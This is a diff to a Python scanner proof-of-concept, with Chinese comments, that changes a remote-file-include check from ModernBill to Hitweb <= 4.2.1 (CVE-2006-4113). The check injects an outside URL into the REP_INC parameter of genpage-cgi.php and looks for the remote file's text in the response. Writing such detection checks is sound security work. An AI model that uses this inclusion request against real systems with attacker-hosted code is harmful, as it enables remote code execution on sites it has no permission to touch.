@@ -6,25 +6,25 @@ import re
 
 
 class Vuln(ABVuln):
-    vuln_id = 'Modernbill_0000'  # 平台漏洞编号
+    vuln_id = 'Hitweb_0000'  # 平台漏洞编号
     # 漏洞名称
-    name = 'Modernbill <= 1.6 (config.php) Remote File Include Vulnerability'
+    name = 'Hitweb <= 4.2.1 (REP_INC) Remote File Include Vulnerability'
     level = VulnLevel.MED  # 漏洞危害级别
-    type = VulnType.LFI  # 漏洞类型
-    disclosure_date = '2006-08-09'  # 漏洞公布时间
+    type = VulnType.RFI  # 漏洞类型
+    disclosure_date = '2006-08-08'  # 漏洞公布时间
     desc = '''
-        ModernGigabyte ModernBill 1.6的include/html/config.php脚本存在PHP远程文件包含漏洞，远程攻击者可借助DIR参数中的URL执行任意PHP代码。
-        Modernbill <= 1.6 (config.php)文件存在远程文件包含漏洞。
+        HITWEB是一个基于PHP、PHPLib和MySQL的站点程序，可提供各种分类的Internet站点集合。 
+        Hitweb <= 4.2.1 (REP_INC)版本存在远程文件包含漏洞 。
     '''  # 漏洞描述
-    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2006-6105'
-    cnvd_id = 'CNVD-2006-6105'  # cnvd漏洞编号
-    cve_id = 'CVE-2006-4034'  # cve编号
-    product = 'Modernbill'  # 漏洞组件名称
-    product_version = '<= 1.6'  # 漏洞应用版本
+    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2006-6159'
+    cnvd_id = 'CNVD-2006-6159'  # cnvd漏洞编号
+    cve_id = 'CVE-2006-4113'  # cve编号
+    product = 'Hitweb'  # 漏洞组件名称
+    product_version = '<= 4.2.1'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = '15400ded-8b24-4dca-95ba-9f39205a2d46'  # 平台 POC 编号
+    poc_id = 'c9b78c66-15a3-4030-9308-b4b0133fe265'  # 平台 POC 编号
     author = '国光'  # POC编写者
     create_date = '2018-06-01'  # POC创建时间
 
@@ -50,7 +50,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            vul_url = arg + '/include/html/config.php?DIR=http://baidu.com/robots.txt?'
+            vul_url = arg + '/genpage-cgi.php?REP_INC=http://baidu.com/robots.txt'
             response = requests.get(vul_url).text
             if 'Baiduspider' in response or 'Googlebot' in response:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
